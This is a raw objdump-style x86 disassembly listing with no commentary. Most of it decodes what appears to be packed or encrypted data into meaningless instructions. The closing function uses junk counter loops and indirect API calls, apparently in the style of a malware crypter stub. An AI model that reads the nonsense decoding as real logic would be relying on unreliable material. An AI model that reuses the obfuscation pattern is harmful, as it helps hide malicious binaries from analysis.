  40e04b:	pop    ebp
  40e04c:	dec    esi
  40e04d:	add    al,BYTE PTR [edx-0x55e47805]
  40e053:	(bad)  
  40e054:	imul   ebp,DWORD PTR [edi-0x3c],0xffffffc9
  40e058:	jg     0x40e0b0
  40e05a:	pop    edi
  40e05b:	jecxz  0x40e086
  40e05d:	add    eax,0x40f3f139
  40e062:	fldl2t 
  40e064:	jecxz  0x40e02b
  40e066:	ss call 0xeb3d:0xd32ea4d5
  40e06e:	popf   
  40e06f:	(bad)
  40e072:	cmp    ch,BYTE PTR [ebx]
  40e074:	aas    
  40e075:	dec    ebp
  40e076:	pop    ss
  40e077:	adc    BYTE PTR [eax-0x524e6d0a],bh
  40e07d:	test   al,0xa1
  40e07f:	xchg   ecx,eax
  40e080:	and    BYTE PTR [esi],0x2e
  40e083:	popa   
  40e084:	mov    eax,ds:0x13cebb2b
  40e089:	inc    esi
  40e08a:	inc    ebp
  40e08b:	addr16 loopne 0x40e0a8
  40e08e:	(bad)  
  40e08f:	loopne 0x40e06b
  40e091:	xlat   BYTE PTR ds:[ebx]
  40e092:	xor    eax,0xeba7bd06
  40e097:	daa    
  40e098:	lock fisttp QWORD PTR [eax-0x50d2ad33]
  40e09f:	add    esp,DWORD PTR [ecx+0x11]
  40e0a2:	and    DWORD PTR [ebp-0x30fef8e3],0xffffffd9
  40e0a9:	push   ebx
  40e0aa:	ret    
  40e0ab:	mov    di,0xf4ee
  40e0af:	loope  0x40e0fd
  40e0b1:	and    bh,BYTE PTR [ebp+0x3d]
  40e0b4:	fcomp  DWORD PTR [ecx+ecx*1+0x6021cdcd]
  40e0bb:	sub    DWORD PTR [edi+0x45],0x52
  40e0bf:	loop   0x40e110
  40e0c1:	add    al,0xf8
  40e0c3:	mov    ds:0x3b8dfa2,eax
  40e0c8:	push   edx
  40e0c9:	(bad)  
  40e0ca:	xchg   edx,eax
  40e0cb:	xchg   edi,eax
  40e0cc:	inc    ebp
  40e0cd:	popf   
  40e0ce:	ror    DWORD PTR [esi+0x34a08065],1
  40e0d4:	rol    DWORD PTR [eax],cl
  40e0d6:	mov    ebp,0x25938fd2
  40e0db:	mov    cl,0x43
  40e0dd:	inc    esp
  40e0de:	jnp    0x40e146
  40e0e0:	jb     0x40e0be
  40e0e2:	in     al,0x64
  40e0e4:	stos   BYTE PTR es:[edi],al
  40e0e5:	pop    ds
  40e0e6:	adc    bl,bh
  40e0e8:	cmp    al,0xb1
  40e0ea:	rcl    ecx,1
  40e0ec:	out    0x3c,eax
  40e0ee:	push   es
  40e0ef:	adc    DWORD PTR [edx+ebp*2-0x572796c5],ecx
  40e0f6:	inc    ebp
  40e0f7:	dec    eax
  40e0f8:	enter  0x647b,0x83
  40e0fc:	out    dx,al
  40e0fd:	imul   DWORD PTR [edi]
  40e0ff:	mov    gs,WORD PTR [edi]
  40e101:	mov    ds:0x9968798a,al
  40e106:	sbb    ebp,DWORD PTR ds:0x3a280542
  40e10c:	sub    BYTE PTR [ebp+0x17],dl
  40e10f:	push   ecx
  40e110:	pop    ecx
  40e111:	and    BYTE PTR [esp+eax*1-0x7f537553],bl
  40e118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e119:	bound  esi,QWORD PTR [ecx-0x1a]
  40e11c:	xchg   ecx,eax
  40e11d:	test   DWORD PTR [ebp-0x1f],edx
  40e120:	les    eax,FWORD PTR cs:[edi-0x7b]
  40e124:	mov    esi,0xf96a71fd
  40e129:	sub    dl,BYTE PTR [ebx]
  40e12b:	rcpps  xmm2,XMMWORD PTR [ecx+0x5d]
  40e12f:	dec    eax
  40e130:	in     al,0xb1
  40e132:	pop    ebx
  40e133:	sbb    BYTE PTR [esi],bl
  40e135:	loopne 0x40e142
  40e137:	cli    
  40e138:	test   al,0x50
  40e13a:	out    dx,al
  40e13b:	cld    
  40e13c:	into   
  40e13d:	inc    esi
  40e13e:	das    
  40e13f:	fs loope 0x40e102
  40e142:	mov    ds:0x4d617781,al
  40e147:	pusha  
  40e148:	inc    ebx
  40e149:	mov    edi,0x3f4baa21
  40e14e:	popf   
  40e14f:	in     al,dx
  40e150:	cs in  al,0x38
  40e153:	adc    bh,BYTE PTR [edi-0x4bfcbfa7]
  40e159:	mov    ch,0x6
  40e15b:	mov    bh,0xcb
  40e15d:	pop    edi
  40e15e:	(bad)  [ebp-0x5cdda7f3]
  40e164:	scas   eax,DWORD PTR es:[edi]
  40e165:	imul   ebp,DWORD PTR [ebp+0x50],0xa58e7e69
  40e16c:	call   0x2f72b482
  40e171:	scas   eax,DWORD PTR es:[edi]
  40e172:	xchg   DWORD PTR [edx+0x2c],esi
  40e175:	jl     0x40e169
  40e177:	and    BYTE PTR [ebx-0x40],ah
  40e17a:	jmp    0xcef1129e
  40e17f:	cli    
  40e180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e181:	mov    dh,0x10
  40e183:	test   eax,0x7b9e70b3
  40e188:	stos   DWORD PTR es:[edi],eax
  40e189:	in     al,dx
  40e18a:	dec    ecx
  40e18b:	ss jmp edi
  40e18e:	cmp    ebp,DWORD PTR [esi]
  40e190:	int3   
  40e191:	cmp    ecx,DWORD PTR ds:0xcdf0c996
  40e197:	imul   edx,edi,0x41
  40e19a:	mov    eax,0xdd171ade
  40e19f:	test   BYTE PTR [ecx],0xa4
  40e1a2:	inc    esp
  40e1a3:	push   cs
  40e1a4:	mov    eax,DWORD PTR [ebx+0x20463ee7]
  40e1aa:	out    0xcf,eax
  40e1ac:	push   edx
  40e1ad:	(bad)  
  40e1ae:	sbb    al,0xf9
  40e1b0:	adc    ah,BYTE PTR [ecx]
  40e1b2:	mov    al,ds:0xdc43706b
  40e1b7:	xchg   DWORD PTR ds:0x6cb4280d,esi
  40e1bd:	inc    edi
  40e1be:	jl     0x40e1ba
  40e1c0:	cld    
  40e1c1:	add    eax,0x9b0adb50
  40e1c6:	cmp    eax,0x512b3e25
  40e1cb:	js     0x40e20d
  40e1cd:	mov    bl,0x47
  40e1cf:	loopne 0x40e1d7
  40e1d1:	call   0x2ccc:0xea3a314d
  40e1d8:	outs   dx,DWORD PTR ds:[esi]
  40e1d9:	(bad)
  40e1dc:	mov    DWORD PTR [ebx+0x2d],edi
  40e1df:	push   esi
  40e1e0:	shl    DWORD PTR [ebp+0x76],cl
  40e1e3:	test   DWORD PTR [ecx],ebx
  40e1e5:	push   0x67e2c399
  40e1ea:	mov    esp,0xad077e9a
  40e1ef:	test   eax,0x4e8f2ca
  40e1f4:	adc    ch,bl
  40e1f6:	xchg   DWORD PTR [ebx-0x35],edx
  40e1f9:	mov    ecx,0x26fde57
  40e1fe:	cmp    eax,0xf6bf10cf
  40e203:	nop
  40e204:	push   ebp
  40e205:	cli    
  40e206:	in     al,0x25
  40e208:	call   0x51df:0xe56dba37
  40e20f:	sbb    BYTE PTR [edi+0x67],0x82
  40e213:	or     DWORD PTR [edi+0x12],edx
  40e216:	sub    ebp,esp
  40e218:	out    dx,al
  40e219:	inc    esi
  40e21a:	mov    eax,0xcae6e240
  40e21f:	ins    BYTE PTR es:[edi],dx
  40e220:	js     0x40e22c
  40e222:	pushf  
  40e223:	dec    esp
  40e224:	or     edx,eax
  40e226:	jmp    0x17b5:0x2d576397
  40e22d:	push   0x44
  40e22f:	ret    0xca60
  40e232:	stos   BYTE PTR es:[edi],al
  40e233:	cli    
  40e234:	fsub   QWORD PTR [edx+0x4f]
  40e237:	inc    esp
  40e238:	call   0x1b2d7f68
  40e23d:	add    ebx,DWORD PTR [ebx]
  40e23f:	aam    0x9c
  40e241:	add    edx,DWORD PTR [ebx]
  40e243:	data16 jl 0x40e205
  40e246:	out    dx,eax
  40e247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e248:	push   0xffffff9b
  40e24a:	pop    edx
  40e24b:	aad    0x39
  40e24d:	(bad)  [esi+0x75]
  40e250:	jmp    0x5345b670
  40e255:	(bad)  
  40e256:	loope  0x40e1fe
  40e258:	or     al,0xd8
  40e25a:	jle    0x40e1eb
  40e25c:	les    ebx,FWORD PTR [edx+0x5639d057]
  40e262:	popf   
  40e263:	ss push ss
  40e265:	dec    esp
  40e266:	mov    al,cs:0x97ca49f2
  40e26c:	dec    ebx
  40e26d:	and    ah,BYTE PTR [ebx+0x160ccf35]
  40e273:	push   0x3815e201
  40e278:	push   ebp
  40e279:	push   ds
  40e27a:	in     al,0x26
  40e27c:	mov    ds:0xe4864319,al
  40e281:	xchg   edi,eax
  40e282:	in     eax,dx
  40e283:	cmp    eax,0x3c8d4bdd
  40e288:	popf   
  40e289:	and    DWORD PTR [edx+edi*1],ecx
  40e28c:	out    0xff,eax
  40e28e:	scas   eax,DWORD PTR es:[edi]
  40e28f:	pop    ss
  40e290:	rcl    ebp,0x57
  40e293:	(bad)  
  40e294:	or     al,BYTE PTR [esi]
  40e296:	xlat   BYTE PTR ds:[ebx]
  40e297:	sub    edi,edx
  40e299:	add    edi,DWORD PTR [ebp-0x10]
  40e29c:	mov    edx,DWORD PTR [ebp-0x20]
  40e29f:	mov    ebx,DWORD PTR [ebp-0x8]
  40e2a2:	xor    edx,eax
  40e2a4:	add    edx,ecx
  40e2a6:	imul   edx,ebx
  40e2a9:	cmp    edx,edi
  40e2ab:	jbe    0x40a4fb
  40e2b1:	pop    ebx
  40e2b2:	jmp    0x40e6c9
  40e2b7:	mov    BYTE PTR [edi+0x6af53ecb],bl
  40e2bd:	xchg   ebp,eax
  40e2be:	imul   esp,ecx,0x3f5e5ddc
  40e2c4:	lock mov ds:0x7eaa2eb7,al
  40e2ca:	jle    0x40e33c
  40e2cc:	jns    0x40e34c
  40e2ce:	jle    0x40e26a
  40e2d0:	fcom   DWORD PTR [edi+edi*8+0x547b502a]
  40e2d8:	mov    ebp,0x11a9d733
  40e2dd:	push   es
  40e2de:	adc    BYTE PTR [esi+0x22598bea],bh
  40e2e4:	xchg   ecx,eax
  40e2e5:	jns    0x40e31b
  40e2e7:	fsub   DWORD PTR [edx-0x496bebf]
  40e2ed:	sbb    al,0xe5
  40e2ef:	or     bl,BYTE PTR [ecx+eax*2]
  40e2f2:	daa    
  40e2f3:	jmp    0x9b22:0xc4addedd
  40e2fa:	mov    eax,0x527281bf
  40e2ff:	sub    al,0x81
  40e301:	jmp    0x623a:0x94d464a8
  40e308:	dec    ecx
  40e309:	in     al,dx
  40e30a:	xchg   DWORD PTR [eax],esp
  40e30c:	fisubr DWORD PTR ss:[edi-0x55]
  40e310:	mov    ds:0x29fd1968,eax
  40e315:	push   edx
  40e316:	cli    
  40e317:	dec    edx
  40e318:	jmp    0xa87e:0xcc4707fd
  40e31f:	(bad)  
  40e320:	(bad)  [esi-0x4b]
  40e323:	mov    al,0xf
  40e325:	(bad)  
  40e326:	cmp    BYTE PTR [ecx-0x1b],dh
  40e329:	inc    edx
  40e32a:	(bad)  
  40e32b:	cmp    BYTE PTR [edi+0x29c18984],bl
  40e331:	leave  
  40e332:	jl     0x40e364
  40e334:	adc    BYTE PTR [edi],dh
  40e336:	pop    ebp
  40e337:	call   0x527fa0b9
  40e33c:	rcr    DWORD PTR [edx-0x346756f1],0xf6
  40e343:	and    DWORD PTR [edi-0x556e0f76],0xffffffd2
  40e34a:	cdq    
  40e34b:	push   esp
  40e34c:	xchg   edi,eax
  40e34d:	(bad)  
  40e34e:	(bad)  
  40e34f:	dec    eax
  40e350:	pop    ss
  40e351:	(bad)  
  40e352:	push   DWORD PTR [ebx+0x5f]
  40e355:	jmp    FWORD PTR [edx]
  40e357:	add    BYTE PTR [esi-0x23],cl
  40e35a:	or     DWORD PTR [edi+0xa2e6ec2],ebp
  40e360:	dec    esi
  40e361:	dec    ecx
  40e362:	jge    0x40e357
  40e364:	jmp    0x40e377
  40e366:	sbb    esp,ebx
  40e368:	cld    
  40e369:	loope  0x40e300
  40e36b:	mov    eax,0x720ac994
  40e370:	jbe    0x40e387
  40e372:	jns    0x40e3d1
  40e374:	add    BYTE PTR [eax+0xd],dl
  40e377:	popa   
  40e378:	fistp  QWORD PTR [ebx+0xe]
  40e37b:	sub    ebp,esi
  40e37d:	mov    eax,es
  40e37f:	sub    DWORD PTR [ebx],edx
  40e381:	hlt    
  40e382:	cld    
  40e383:	dec    ecx
  40e384:	add    edi,edx
  40e386:	adc    ch,BYTE PTR [edx+eax*2]
  40e389:	push   cs
  40e38a:	imul   esi,DWORD PTR [edi-0x1f],0xffffffd6
  40e38e:	jbe    0x40e33d
  40e390:	xor    al,0xfe
  40e392:	jnp    0x40e3cb
  40e394:	dec    eax
  40e395:	loope  0x40e322
  40e397:	call   0x374e:0x5841a4cd
  40e39e:	js     0x40e3bc
  40e3a0:	aas    
  40e3a1:	add    BYTE PTR [esi-0x13913b94],dh
  40e3a7:	xor    edx,DWORD PTR [ebx+ecx*1+0x7545d46d]
  40e3ae:	sbb    edi,DWORD PTR [edx]
  40e3b0:	leave  
  40e3b1:	aaa    
  40e3b2:	and    cl,BYTE PTR [esi-0x5c86e24a]
  40e3b8:	into   
  40e3b9:	push   0x3df2207f
  40e3be:	mul    BYTE PTR [ecx]
  40e3c0:	lods   al,BYTE PTR ds:[esi]
  40e3c1:	push   esp
  40e3c2:	shr    BYTE PTR [esi+0x3c],1
  40e3c5:	lea    edx,[edi+0x53b0825b]
  40e3cb:	xor    DWORD PTR [ebp+0x2a0b972f],edx
  40e3d1:	imul   ebx,DWORD PTR [ebx+0xd7757e0],0x22f6955e
  40e3db:	xlat   BYTE PTR ds:[ebx]
  40e3dc:	mov    edx,0x319d2e68
  40e3e1:	xlat   BYTE PTR ds:[ebx]
  40e3e2:	ja     0x40e3c2
  40e3e4:	adc    edx,DWORD PTR [edx+0x69543aef]
  40e3ea:	jno    0x40e380
  40e3ec:	jns    0x40e3f8
  40e3ee:	rcr    BYTE PTR [edx+0x33],0xfb
  40e3f2:	aam    0x58
  40e3f4:	mov    eax,ds:0xda38a7a9
  40e3f9:	push   ss
  40e3fa:	ficom  DWORD PTR [edi-0x506298a7]
  40e400:	or     cl,BYTE PTR [eax+edi*4+0x414a5e23]
  40e407:	pop    esp
  40e408:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e409:	xor    BYTE PTR [edx+0x72e5cbf3],bh
  40e40f:	pop    edi
  40e410:	jmp    0x782b:0x640e0ca3
  40e417:	outs   dx,BYTE PTR ds:[esi]
  40e418:	mov    cl,0x73
  40e41a:	fwait
  40e41b:	fwait
  40e41c:	push   cs
  40e41d:	push   ds
  40e41e:	jle    0x40e3da
  40e420:	sub    BYTE PTR [ecx+0x3f],ah
  40e423:	fs cdq 
  40e425:	dec    ebp
  40e426:	cld    
  40e427:	leave  
  40e428:	inc    eax
  40e429:	push   edx
  40e42a:	adc    cl,ch
  40e42c:	push   edi
  40e42d:	xlat   BYTE PTR ds:[ebx]
  40e42e:	ret    
  40e42f:	in     al,0xb9
  40e431:	add    ch,0x19
  40e434:	sar    dh,1
  40e436:	dec    ebx
  40e437:	aad    0x4
  40e439:	cdq    
  40e43a:	inc    edi
  40e43b:	popf   
  40e43c:	je     0x40e3d5
  40e43e:	nop
  40e43f:	inc    ebx
  40e440:	xor    edi,esi
  40e442:	jo     0x40e3da
  40e444:	sar    cl,0x3f
  40e447:	bound  edi,QWORD PTR [esi+0x274b717c]
  40e44d:	clc    
  40e44e:	push   eax
  40e44f:	push   0x5f
  40e451:	fldcw  WORD PTR [eax-0x45]
  40e454:	out    dx,al
  40e455:	xchg   edi,eax
  40e456:	push   0x56
  40e458:	in     al,dx
  40e459:	lods   eax,DWORD PTR ds:[esi]
  40e45a:	sbb    al,0x13
  40e45c:	mov    dh,0xe7
  40e45e:	inc    edx
  40e45f:	int3   
  40e460:	mov    eax,ebp
  40e462:	popa   
  40e463:	daa    
  40e464:	inc    esp
  40e465:	xchg   edi,eax
  40e466:	and    esp,ebx
  40e468:	mov    edx,DWORD PTR [esi-0x295b1131]
  40e46e:	not    BYTE PTR [edx+ebp*4-0x78]
  40e472:	ja     0x40e444
  40e474:	jmp    DWORD PTR [ebx-0x2c]
  40e477:	stos   BYTE PTR es:[edi],al
  40e478:	pop    es
  40e479:	push   es
  40e47a:	pop    ds
  40e47b:	and    eax,0x5905dabe
  40e480:	rcr    cl,1
  40e482:	js     0x40e455
  40e484:	mov    bl,0x5d
  40e486:	lea    ecx,[edx]
  40e488:	cmp    DWORD PTR [eax-0x76],ecx
  40e48b:	mov    ebx,0x8cdaf28e
  40e490:	mov    eax,0x148df56c
  40e495:	xor    BYTE PTR [edi],al
  40e497:	jecxz  0x40e514
  40e499:	arpl   WORD PTR [edi],dx
  40e49b:	sub    al,0x1d
  40e49d:	push   ebx
  40e49e:	push   esi
  40e49f:	cs push ecx
  40e4a1:	push   ss
  40e4a2:	clc    
  40e4a3:	dec    ebp
  40e4a4:	fdivr  QWORD PTR [ecx-0x90c188d]
  40e4aa:	jge    0x40e4f4
  40e4ac:	dec    ebp
  40e4ad:	inc    ecx
  40e4ae:	sub    eax,0x3d7b7623
  40e4b3:	lods   eax,DWORD PTR ds:[esi]
  40e4b4:	leave  
  40e4b5:	adc    ah,BYTE PTR [eax]
  40e4b7:	sbb    al,0xd6
  40e4b9:	iret   
  40e4ba:	test   eax,0x70fe38b4
  40e4bf:	xor    edi,DWORD PTR fs:[edx+0x39]
  40e4c3:	jmp    0xc02:0xe5480994
  40e4ca:	sbb    al,0xf1
  40e4cc:	stc    
  40e4cd:	clc    
  40e4ce:	dec    edx
  40e4cf:	mov    fs,WORD PTR [edi]
  40e4d1:	cli    
  40e4d2:	iret   
  40e4d3:	xor    eax,0x4ca1d370
  40e4d8:	lea    edi,[edx-0x7c]
  40e4db:	jmp    0x40e46f
  40e4dd:	mov    ch,0x2e
  40e4df:	daa    
  40e4e0:	cwde   
  40e4e1:	xor    al,0x94
  40e4e3:	or     al,0x61
  40e4e5:	adc    DWORD PTR [eax],edx
  40e4e7:	loope  0x40e48a
  40e4e9:	es loope 0x40e556
  40e4ec:	sbb    ebx,edx
  40e4ee:	push   0xd2f0f88e
  40e4f3:	in     eax,0x8e
  40e4f5:	sub    eax,0x295c7404
  40e4fa:	cdq    
  40e4fb:	daa    
  40e4fc:	sbb    BYTE PTR [edx],ah
  40e4fe:	out    dx,al
  40e4ff:	in     eax,dx
  40e500:	xlat   BYTE PTR ds:[ebx]
  40e501:	ds loopne 0x40e492
  40e504:	out    0x40,al
  40e506:	mov    es,edx
  40e508:	retf   
  40e509:	int3   
  40e50a:	cmc    
  40e50b:	mov    dl,0x6
  40e50d:	mov    DWORD PTR [eax+0x350449d5],ecx
  40e513:	ret    
  40e514:	xor    al,0xdc
  40e516:	xor    al,0x95
  40e518:	sbb    DWORD PTR [eax-0x57],esi
  40e51b:	push   eax
  40e51c:	xchg   edx,eax
  40e51d:	cmp    BYTE PTR [edx],bl
  40e51f:	sub    edi,eax
  40e521:	adc    DWORD PTR [edi+eiz*2-0x29df9cc0],edi
  40e528:	daa    
  40e529:	loopne 0x40e518
  40e52b:	jns    0x40e4d7
  40e52d:	mov    ecx,0x9dd26f63
  40e532:	ins    BYTE PTR es:[edi],dx
  40e533:	xor    DWORD PTR [ebp+eax*1+0x37],ebx
  40e537:	inc    esi
  40e538:	daa    
  40e539:	int3   
  40e53a:	lods   al,BYTE PTR ds:[esi]
  40e53b:	pop    ebp
  40e53c:	jp     0x40e4c9
  40e53e:	stos   DWORD PTR es:[edi],eax
  40e53f:	xor    eax,0xb3bd1a53
  40e544:	cld    
  40e545:	pushf  
  40e546:	clc    
  40e547:	sub    al,0x6b
  40e549:	add    edi,ebx
  40e54b:	mov    ebx,0x2fb9d30e
  40e550:	jmp    0x5d87:0xfbaed9f4
  40e557:	shr    DWORD PTR ds:0xbcacc2a1,0xb8
  40e55e:	adc    BYTE PTR [ebp-0xcec7cb6],ah
  40e564:	ror    DWORD PTR [eax+0x61],0x5f
  40e568:	int    0x29
  40e56a:	fist   DWORD PTR [ebx+0x4b]
  40e56d:	das    
  40e56e:	sbb    dh,BYTE PTR [ebx]
  40e570:	mov    ebp,DWORD PTR [ecx+eiz*1-0x1e]
  40e574:	mov    dh,0xc4
  40e576:	into   
  40e577:	dec    edx
  40e578:	loope  0x40e545
  40e57a:	push   0xffffffbb
  40e57c:	clc    
  40e57d:	sub    DWORD PTR [esp+edi*2+0x5695a4b],edi
  40e584:	mov    ebx,0x25bdea0d
  40e589:	out    0x5a,al
  40e58b:	int3   
  40e58c:	lds    eax,FWORD PTR [edi+0x6a]
  40e58f:	repz or esp,DWORD PTR [ebx]
  40e592:	loope  0x40e5cb
  40e594:	push   cs
  40e595:	pop    eax
  40e596:	pop    ebx
  40e597:	mov    edx,0x2d446ed
  40e59c:	pop    edi
  40e59d:	stos   DWORD PTR es:[edi],eax
  40e59e:	jb     0x40e5d2
  40e5a0:	sub    DWORD PTR [esi],esp
  40e5a2:	outs   dx,DWORD PTR ds:[esi]
  40e5a3:	rcl    ecx,cl
  40e5a5:	mov    esi,0xe14e55a6
  40e5aa:	jmp    0x40e5a4
  40e5ac:	mov    WORD PTR [eax],ds
  40e5ae:	outs   dx,DWORD PTR ds:[esi]
  40e5af:	dec    esi
  40e5b0:	and    DWORD PTR [edi-0x28b5ed31],ebp
  40e5b6:	icebp  
  40e5b7:	pop    eax
  40e5b8:	push   es
  40e5b9:	push   es
  40e5ba:	and    al,0x54
  40e5bc:	mov    edi,0x1dc2012e
  40e5c1:	loopne 0x40e5e3
  40e5c3:	retf   
  40e5c4:	jl     0x40e5d4
  40e5c6:	cmp    ch,BYTE PTR ds:0xf0e6e498
  40e5cc:	inc    esi
  40e5cd:	daa    
  40e5ce:	sub    ah,bl
  40e5d0:	bound  esi,QWORD PTR [eax-0x6b11e99c]
  40e5d6:	pop    ecx
  40e5d7:	push   0xffffffca
  40e5d9:	dec    ebx
  40e5da:	mov    al,BYTE PTR [eax+0x4e]
  40e5dd:	add    BYTE PTR [si],bl
  40e5e0:	push   ebx
  40e5e1:	(bad)  
  40e5e2:	jp     0x40e587
  40e5e4:	jg     0x40e5cc
  40e5e6:	xor    BYTE PTR [ebp+0x38],cl
  40e5e9:	add    DWORD PTR [edi-0x758b229d],0x18e6317f
  40e5f3:	in     eax,0x34
  40e5f5:	ins    BYTE PTR es:[edi],dx
  40e5f6:	mov    esi,0x244ad8
  40e5fb:	cmp    cl,al
  40e5fd:	fstp   QWORD PTR [esi]
  40e5ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e600:	hlt    
  40e601:	in     eax,0xaf
  40e603:	xchg   ebp,eax
  40e604:	ret    0xefc6
  40e607:	mov    ebp,0x9b3c8369
  40e60c:	test   eax,0xc0c5a23e
  40e611:	(bad)  
  40e612:	xchg   ebx,eax
  40e613:	cdq    
  40e614:	sub    DWORD PTR [ebp+edx*2-0x59],0x82e2da17
  40e61c:	mov    ebp,0xe6d1a253
  40e621:	cdq    
  40e622:	add    DWORD PTR [edx+0x2b],0x179358f1
  40e629:	xor    ecx,DWORD PTR [ebp-0x5]
  40e62c:	dec    ecx
  40e62d:	push   esi
  40e62e:	loopne 0x40e5b1
  40e630:	xchg   edi,eax
  40e631:	pop    es
  40e632:	js     0x40e5cc
  40e634:	and    eax,0x457c630f
  40e639:	retf   
  40e63a:	push   esi
  40e63b:	lock pop ds
  40e63d:	pop    edi
  40e63e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e63f:	clc    
  40e640:	jmp    0x1bc7:0xdf756d0f
  40e647:	pusha  
  40e648:	repnz (bad) 
  40e64a:	and    esi,DWORD PTR [ecx+0x32]
  40e64d:	(bad)  
  40e64f:	out    dx,eax
  40e650:	dec    ebp
  40e651:	pop    edx
  40e652:	or     ebp,DWORD PTR [ebx+0x29a308f7]
  40e658:	gs mov cl,0x19
  40e65b:	mov    al,0x7a
  40e65d:	or     BYTE PTR [ebp-0xc],bl
  40e660:	jbe    0x40e6c7
  40e662:	push   eax
  40e663:	stos   BYTE PTR es:[edi],al
  40e664:	mov    bl,0x63
  40e666:	lahf   
  40e667:	jl     0x40e60b
  40e669:	push   eax
  40e66a:	nop
  40e66b:	xor    ecx,DWORD PTR [ebx+ebp*8-0x68798a5f]
  40e672:	inc    edi
  40e673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e674:	test   BYTE PTR [esi-0x31fd09bb],ah
  40e67a:	cmp    BYTE PTR [ebp-0x70],cl
  40e67d:	push   eax
  40e67e:	test   BYTE PTR [esi],bl
  40e680:	add    ecx,DWORD PTR [ebp+0x30]
  40e683:	jmp    0x9d700050
  40e688:	fadd   st(0),st
  40e68a:	mov    bh,0xb5
  40e68c:	ret    0x5147
  40e68f:	pop    edi
  40e690:	jp     0x40e69d
  40e692:	jne    0x40e6e4
  40e694:	call   0xe129:0xcb778f72
  40e69b:	or     ah,ah
  40e69d:	es pop ds
  40e69f:	ds popa 
  40e6a1:	pop    ebp
  40e6a2:	push   ds
  40e6a3:	sbb    BYTE PTR [esi+0x5a],cl
  40e6a6:	xlat   BYTE PTR ds:[ebx]
  40e6a7:	push   edi
  40e6a8:	int    0x52
  40e6aa:	pusha  
  40e6ab:	(bad)  
  40e6ac:	pop    eax
  40e6ad:	mov    bh,0x47
  40e6af:	clc    
  40e6b0:	(bad)  
  40e6b1:	mov    eax,ds:0x55689d2c
  40e6b6:	scas   eax,DWORD PTR es:[edi]
  40e6b7:	sti    
  40e6b8:	xor    DWORD PTR [ebx-0x13],edx
  40e6bb:	cmp    al,0xa1
  40e6bd:	push   edi
  40e6be:	mov    ah,0xa0
  40e6c0:	mov    ah,0xb6
  40e6c2:	aaa    
  40e6c3:	pushf  
  40e6c4:	bound  edi,QWORD PTR [esi+0x5f3650b2]
  40e6ca:	leave  
  40e6cb:	ret    0x8
  40e6ce:	push   ebp
  40e6cf:	mov    ebp,esp
  40e6d1:	sub    esp,0xa8
  40e6d7:	sbb    DWORD PTR ds:0x434613,0x1bda
  40e6e1:	push   ebx
  40e6e2:	sbb    DWORD PTR ds:0x4345c3,0x5a23
  40e6ec:	push   esi
  40e6ed:	inc    DWORD PTR ds:0x434547
  40e6f3:	push   edi
  40e6f4:	and    DWORD PTR ds:0x43453b,0x6624
  40e6fe:	push   0x414c56
  40e703:	adc    DWORD PTR ds:0x434503,0x6b43
  40e70d:	call   DWORD PTR ds:0x41340c
  40e713:	test   eax,eax
  40e715:	mov    DWORD PTR ds:0x434537,0x267
  40e71f:	je     0x40e741
  40e725:	adc    DWORD PTR ds:0x4345c7,0x4344df
  40e72f:	xor    eax,eax
  40e731:	inc    eax
  40e732:	mov    DWORD PTR ds:0x4344eb,0x5274
  40e73c:	jmp    0x40f150
  40e741:	add    DWORD PTR ds:0x43453b,ecx
  40e747:	mov    DWORD PTR [ebp-0x24],0xf89c8536
  40e74e:	and    DWORD PTR ds:0x4345d3,0x0
  40e758:	jmp    0x40e76a
  40e75d:	mov    edi,DWORD PTR ds:0x4345d3
  40e763:	inc    edi
  40e764:	mov    DWORD PTR ds:0x4345d3,edi
  40e76a:	cmp    DWORD PTR ds:0x4345d3,0x16
  40e771:	jae    0x40e855
  40e777:	cmp    DWORD PTR ds:0x4345d3,0xd
  40e77e:	jne    0x40e79e
  40e784:	push   0x4344eb
  40e789:	push   0x6202
  40e78e:	push   0x434688
  40e793:	push   0x434771
  40e798:	call   DWORD PTR ds:0x413344
  40e79e:	cmp    DWORD PTR ds:0x4345d3,0xc
  40e7a5:	jne    0x40e7b8
  40e7ab:	mov    edi,DWORD PTR ds:0x4345d3
  40e7b1:	inc    edi
  40e7b2:	mov    DWORD PTR ds:0x4345d3,edi
  40e7b8:	jmp    0x40e75d
  40e7bd:	and    DWORD PTR ds:0x43457b,0x0
  40e7c7:	jmp    0x40e7d9
  40e7cc:	mov    edi,DWORD PTR ds:0x43457b
  40e7d2:	inc    edi
  40e7d3:	mov    DWORD PTR ds:0x43457b,edi
  40e7d9:	cmp    DWORD PTR ds:0x43457b,0x11
  40e7e0:	jae    0x40e855
  40e7e6:	cmp    DWORD PTR ds:0x43457b,0x1c
  40e7ed:	jne    0x40e806
  40e7f3:	push   0x43481f
  40e7f8:	push   DWORD PTR [ebp-0x24]
  40e7fb:	push   0x501d
  40e800:	call   DWORD PTR ds:0x413348
  40e806:	jmp    0x40e7cc
  40e80b:	mov    DWORD PTR ds:0x43453b,0x17
  40e815:	cmp    DWORD PTR ds:0x43453b,0x0
  40e81c:	je     0x40e855
  40e822:	cmp    DWORD PTR ds:0x43453b,0x24
  40e829:	jne    0x40e83d
  40e82f:	push   0x3379
  40e834:	push   DWORD PTR [ebp-0x24]
  40e837:	call   DWORD PTR ds:0x4130c8
  40e83d:	mov    ecx,DWORD PTR ds:0x43453b
  40e843:	dec    ecx
  40e844:	mov    DWORD PTR ds:0x43453b,ecx
  40e84a:	jmp    0x40e815
  40e84f:	sub    DWORD PTR ds:0x43458b,edx
  40e855:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  40e85c:	sbb    DWORD PTR ds:0x4345bf,0x434507
  40e866:	lea    eax,[ebp-0x2c]
  40e869:	movzx  ecx,BYTE PTR ds:0x4344f3
  40e870:	and    ecx,DWORD PTR ds:0x4345cf
  40e876:	mov    DWORD PTR ds:0x4344f3,ecx
  40e87c:	mov    DWORD PTR [ebp-0x18],eax
  40e87f:	mov    DWORD PTR ds:0x434547,0x13
  40e889:	cmp    DWORD PTR ds:0x434547,0x0
  40e890:	je     0x40e94f
  40e896:	cmp    DWORD PTR ds:0x434547,0x3
  40e89d:	jne    0x40e8b6
  40e8a3:	push   0x8243
  40e8a8:	push   0x5b51
  40e8ad:	push   DWORD PTR [ebp-0x18]
  40e8b0:	call   DWORD PTR ds:0x4130cc
